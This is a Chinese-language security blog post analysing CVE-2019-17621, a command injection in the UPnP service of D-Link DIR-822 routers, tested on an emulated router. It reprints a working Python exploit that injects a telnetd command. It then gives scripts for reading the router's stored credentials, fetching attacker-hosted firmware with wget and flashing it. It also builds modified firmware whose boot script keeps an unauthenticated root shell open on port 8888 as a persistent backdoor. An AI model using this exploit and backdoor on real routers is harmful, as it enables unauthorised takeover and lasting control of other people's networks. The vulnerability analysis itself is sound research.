![](https://image.3001.net/images/20210301/1614577388_603c7eec272c718b11248.jpg!small)

**作者：维阵漏洞研究员——km1ng**

  

## 简述

本次分析的漏洞为cve-2019-17621，是一个远程代码执行漏洞（无需身份验证，一般处于局域网）。

因为网上多是对Dlink-859的分析并且Dlink859已有补丁，所以这里采用对Dlink822进行分析。网上的文章多是分析完毕证明有这个漏洞就结束，本篇文章还将介绍如何仿真路由器，在证明漏洞存在后，如何更改固件、刷新固件并且长久驻留的一个解决方案。

UPNP（Universal Plug and
Play）即通用即插即用协议,是为了实现电脑与智能的电器设备对等网络连接的体系结构。而内网地址与网络地址的转换就是基于此协议的，因此只要我们的路由器支持upnp，那么我们就可以借此提高点对点传输速度。

## 分析环境

![v2-e7382f57b48acea4ff6695e3fee3bdba_720w.jpg](https://image.3001.net/images/20210301/1614577563_603c7f9bb5e44f7d77867.jpg!small)

## 漏洞分析

下载固件:[http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822](https://link.zhihu.com/?target=http%3A//support.dlink.com.cn%3A9000/ProductInfo.aspx%3Fm%3DDIR-822)

固件的MD5为27fd2601cc6ae24a0db7b1066da08e1e。

使用binwalk-e 命令解压固件。

    
    
    binwalk-e DIR822A1_FW103WWb03.bin

使用file指令查看squashfs-root/bin/busybox发现是mips架构的路由器,进入squashfs-root目录将htdocs/cgibin文件拷贝出来,放入IDA中分析。

genacgi_main函数是漏洞开始触发点，通过“REQUEST_URI”获取url后对其进行验证，然后进入sub_40FCE0。

![v2-a6873c3c91d7e406db3b69c113dd5b7c_720w.jpg](https://image.3001.net/images/20210301/1614577564_603c7f9c2a3a12edff3cc.jpg!small)

下图为sub_40FCE0函数，其中a1为上图中传入的url，通过xmldbc_ephp函数使用socket发送出去。

![v2-9b6a71b8a7e498330b0dd1b48b53e3b5_720w.jpg](https://image.3001.net/images/20210301/1614577564_603c7f9ccdc914880bdd3.jpg!small)

数据现在由PHP文件run.NOTIFY.php进行处理，其中请求方法会被再次验证。

![v2-ddbfd94de2ed7b60c582e30e852f267c_720w.jpg](https://image.3001.net/images/20210301/1614577565_603c7f9d348469c2b0ca4.jpg!small)

该脚本会调用PHP函数GENA_subscribe_new()，并向其传递cgibin程序中genacgi_main()函数获得的变量，还包括变量SHELL_FILE。

文件：gena.php，函数GENA_subscribe_new()

![v2-86119ea2e02df7b50e0b8edb8d73209b_720w.jpg](https://image.3001.net/images/20210301/1614577565_603c7f9dd6db37727478f.jpg!small)

GENA_subscribe_new()函数并不修改$shell_file变量。

gena.php，GENA_notify_init()函数：

![v2-6591e9028add33abcd383ae950c16d59_720w.jpg](https://image.3001.net/images/20210301/1614577566_603c7f9e7bccf998c807d.jpg!small)

这就是变量SHELL_FILE结束的地方，它是通过调用PHP函数fwrite()创建的新文件的名称的一部分。

这个函数被使用了两次：第一次创建文件，它的名字来自我们控制的SHELL_FILE变量以及getpid()的输出。第二次调用fwrite()向这个文件添加了一行，其中还使用了rm系统命令，以删除它自己。为了进行攻击，我们只需要插入一个反引号包裹的系统命令，然后将其注入到shell脚本中。

## 漏洞验证

exp如下，通过这个漏洞，我们可以利用telnet服务来进行访问。因为这个漏洞是UPnP协议漏洞，一般处于局域网才能使用。

    
    
    import socket
    import os
    from time import sleep
    Exploit By Miguel Mendez & Pablo Pollanco
    def httpSUB(server, port, shell_file):
    print('\n[] Connection {host}:{port}'.format(host=server, port=port)) con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n" request += "Host: " + str(server) + str(port) + "\n" request += "Callback: http://192.168.0.4:34033/ServiceProxy27\n" request += "NT: upnp:event\n" request += "Timeout: Second-1800\n" request += "Accept-Encoding: gzip, deflate\n" request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n" sleep(1) print('[] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(str(request))
    results = con.recv(4096)
    sleep(1)
    print('[] Running Telnetd Service') sleep(1) print('[] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')
    serverInput = '192.168.0.1'
    portInput = 49152
    httpSUB(serverInput, portInput, 'telnetd -p 9999 &')

这里使用firmware-analysis-plus框架仿真路由器，地址：[https://github.com/liyansong2018/firmware-analysis-plus](https://link.zhihu.com/?target=https%3A//github.com/liyansong2018/firmware-analysis-plus)。

    
    
    python3 fat.py -q git/firmware-analysis-plus/qemu-builds/2.5.0/ /home/admin-dir/bin/dlink/DIR822A1_FW103WWb03.bin

![v2-f5c9b5c3b1ca4794546182dc6af651be_720w.jpg](https://image.3001.net/images/20210301/1614577566_603c7f9ecf941d74fcb83.jpg!small)

有可能使用浏览器访问192.168.0.1遇到不安全的TLS警告，直接启用即可。

使用nmap扫描端口，可以发现49152端口是默认开启的。

![v2-d765246a1b638b7738fb73ab2379e44c_720w.jpg](https://image.3001.net/images/20210301/1614577567_603c7f9f355d7dded8ad2.jpg!small)

使用exp测试仿真路由器，nmap扫描可以发现9999端口已被打开，并且成功登录telnet。

![v2-71d81724019c3345667d0e21d2c44953_720w.jpg](https://image.3001.net/images/20210301/1614577567_603c7f9fa9491439183d2.jpg!small)

## 固件更新

更新固件使用仿真路由器有一些小缺陷，没有这款路由器的也可以继续使用仿真路由器做更新固件。更新固件的操作使用物理路由器。先介绍一种比较简单的办法，通过telnet登录822路由器，cat/var/passwd路由器里面存放这路由器的账号密码，通过web端更新固件。

![v2-ffe78741a900df283bdf2da1a317c311_720w.jpg](https://image.3001.net/images/20210301/1614577568_603c7fa00d8d96b251171.jpg!small)![v2-94baafe90c502b735807bf5f962bbfa1_720w.jpg](https://image.3001.net/images/20210301/1614577568_603c7fa05a1225edb0090.jpg!small)

手动登录路由器telnet，wget固件然后升级，这里给出822路由器升级脚本为squashfs-root/usr/sbin/fw_upgrade。

![v2-5b69e570d718bd06da4c8e3b568d8659_720w.jpg](https://image.3001.net/images/20210301/1614577568_603c7fa0baf86f3485195.jpg!small)

下面再看一下etc/events/FWUPDATER.sh文件里面的操作。

![v2-728bab6f77f3d1ca05703e9c8b4a21aa_720w.jpg](https://image.3001.net/images/20210301/1614577569_603c7fa12c2679f76cc09.jpg!small)

并没有什么特别的操作，这里选择直接调用usr/sbin/fw_upgrade脚本文件，下面为笔者更新固件脚本，读者只需要少量更改即可使用。

    
    
    cd
    cd /var
    wget http://192.168.0.36:8000/DIR822A1_FW103WWb03.bin
    mv DIR822A1_FW103WWb03.bin firmware.seama
    chmod 777 firmware.seama
    mount -t ramfs ramfs /proc
    mkdir /proc/driver
    cd
    /usr/sbin/fw_upgrade /var/firmware.seama

现在更新脚本有了，也能登录上去，可以制作新的固件添加自己的功能。

推荐使用firmware-mod-kit框架，git地址：[https://github.com/rampageX/firmware-mod-kit](https://link.zhihu.com/?target=https%3A//github.com/rampageX/firmware-mod-kit)。

    
    
    /firmware-mod-kit/extract-firmware.sh DIR822A1_FW103WWb03.bin

![v2-155b532cc2301f709bcd832410f90dc4_720w.jpg](https://image.3001.net/images/20210301/1614577569_603c7fa191dd978cb70be.jpg!small)

现在会在其目录下发现fmk目录，进入fmk/rootfs可以见到路由器的文件系统。进入etc/init0.d/会发现rcS文件，对固件的改动就在这里面。

![v2-e433e55e9bc48163d8828d5709f4dd02_720w.jpg](https://image.3001.net/images/20210301/1614577569_603c7fa1ed32999611884.jpg!small)

追加rcS文件/etc/init0.d/fir.sh，fir.sh为自己创建的脚本。

![v2-5367a95dd7274cd17178f2960a8a62e0_720w.jpg](https://image.3001.net/images/20210301/1614577570_603c7fa2522b3bbd01e52.jpg!small)

下面为fir.sh脚本内容：

    
    
    #!/bin/sh
    min=1
    while :
    do
        telnetd -l /bin/sh -p 8888
        sleep 1h
        echo $min
    done

返回fmk的同级目录，使用firmware-mod-kit/build-firmware.sh即可完成固件打包。

![v2-c87f91feaf4fcce7fb70706bcc8c8a53_720w.jpg](https://image.3001.net/images/20210301/1614577570_603c7fa2991f069cac404.jpg!small)

python-m SimpleHTTPServer 8080搭建起一个简单的web服务。将改好的dlink.sh和固件放入web服务目录下。

使用漏洞利用登录到telnet，进入tmp目录使用wget请求dlink.sh。

![v2-1183bfda1fb0cdef03c48b22648a1907_720w.jpg](https://image.3001.net/images/20210301/1614577571_603c7fa3228af8912c36c.jpg!small)

运行dlink.sh，固件刷新需要稍等几分钟。

![v2-c0effa2005517964e841d04ce5f41848_720w.jpg](https://image.3001.net/images/20210301/1614577571_603c7fa37b22a9f51aa84.jpg!small)![v2-02d9380da26e9cb364c965d665c1c91b_720w.jpg](https://image.3001.net/images/20210301/1614577571_603c7fa3bb555eb31399c.jpg!small)

看上去是更新成功了，使用nmap扫描一下，固件里面的时间和版本号根据需求搜索更改即可。

![v2-5d828c4f461e778dd9141c096ea534d0_720w.jpg](https://image.3001.net/images/20210301/1614577572_603c7fa422abf7349ca63.jpg!small)

尝试使用这个端口号登录telnet，使用ps命令查看进程，发现固件已被更新。

![v2-b99eff7b3d50e15b0f4e9e7dc8dfc74d_720w.jpg](https://image.3001.net/images/20210301/1614577572_603c7fa47a448d30f09fa.jpg!small)

## 总结

本次漏洞分析利用，这个漏洞相对来说比较简单，在已爆出cve的情况下分析利用漏洞所占时间并不是很多，更多的时间是花在如：寻找验证固件更新脚本上。在成功利用漏洞的基础上，添加了后门提高了对路由器的长久稳定控制。

cve官网并未爆出，822A1版本的路由器受到影响，可以先使用IDA分析，确认有漏洞之后在使用仿真模拟确认路由器是否真的存在这个漏洞。这种方式快捷简单、无需时间等待和经济压力。

